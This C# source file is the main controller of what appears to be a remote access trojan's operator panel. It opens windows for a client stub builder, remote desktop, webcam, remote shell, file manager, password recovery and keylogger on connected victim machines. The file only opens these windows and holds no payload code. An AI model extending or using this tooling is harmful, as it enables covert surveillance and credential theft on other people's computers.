using Serveur.Controllers.Server;
using Serveur.Views;
using System;
using System.Collections.Generic;
using System.Windows.Forms;

namespace Serveur.Controllers
{
    class FrmMainController
    {
        private List<ClientMosaic> _clientControllers;

        public void frmListener(FrmListenerController frmListenerController)
        {
            try
            {
                FrmListener frmListener = new FrmListener(frmListenerController);
                frmListener.Text = "settings";
                frmListener.ShowDialog();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "FrmListener MainController", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        //STUB
        public void frmBuilder()
        {
            try
            {
                FrmBuilder frmStub = new FrmBuilder();
                frmStub.Text = "Client Builer";
                frmStub.Show();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "FrmStub MainController", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        public void frmRdp(ClientMosaic client)
        {
            try
            {
                FrmRemoteDesktop frmRdp = new FrmRemoteDesktop(client);
                frmRdp.Text = "Remote Desktop" + ' ' + client.endPoint.Address + " : " + client.endPoint.Port;
                frmRdp.ShowDialog();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "FrmRdp MainController", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        public void frmWbc(ClientMosaic client)
        {
            try
            {
                FrmRemoteWebcam frmwbc = new FrmRemoteWebcam(client);
                frmwbc.Text = "Remote Webcam" + ' ' + client.endPoint.Address + " : " + client.endPoint.Port;
                frmwbc.ShowDialog();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString(), "FrmWbc MainController", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        public void frmRms(ClientMosaic client)
        {
            try
            {
                FrmRemoteShell frmRemoteShell = new FrmRemoteShell(client);
                frmRemoteShell.Text = "Remote Shell" + ' ' + client.endPoint.Address + " : " + client.endPoint.Port;
                frmRemoteShell.ShowDialog();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "FrmRms MainController", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        public void frmFm(ClientMosaic client)
        {
            try
            {
                FrmFileManager frmFm = new FrmFileManager(client);
                frmFm.Text = "File Manager" + ' ' + client.endPoint.Address + " : " + client.endPoint.Port;
                frmFm.ShowDialog();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "FrmFm MainController", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        public void frmTm(ClientMosaic client)
        {
            try
            {
                FrmTaskManager frmTm = new FrmTaskManager(client);
                frmTm.Text = "Task Manager" + ' ' + client.endPoint.Address + " : " + client.endPoint.Port;
                frmTm.ShowDialog();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "FrmTm MainController", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        public void frmSi(ClientMosaic client)
        {
            try
            {
                FrmSystemInformation frmSi = new FrmSystemInformation(client);
                frmSi.Text = "System Information" + ' ' + client.endPoint.Address + " : " + client.endPoint.Port;
                frmSi.ShowDialog();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "FrmSi MainController", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        public void frmStm(ClientMosaic client)
        {
            try
            {
                FrmStartupManager frmStm = new FrmStartupManager(client);
                frmStm.Text = "Startup Manager" + ' ' + client.endPoint.Address + " : " + client.endPoint.Port;
                frmStm.ShowDialog();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "FrmStm MainController", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        public void frmPr(ClientMosaic client)
        {
            try
            {
                FrmPasswordRecovery frmPr = new FrmPasswordRecovery(client);
                frmPr.Text = "Password Recovery" + ' ' + client.endPoint.Address + " : " + client.endPoint.Port;
                frmPr.ShowDialog();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "FrmPr MainController", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        public void frmKl(ClientMosaic client)
        {
            try
            {
                FrmKeyLogger frmKl = new FrmKeyLogger(client);
                frmKl.Text = "KeyLogger" + ' ' + client.endPoint.Address + " : " + client.endPoint.Port;
                frmKl.ShowDialog();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "FrmPr MainController", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
    }
}
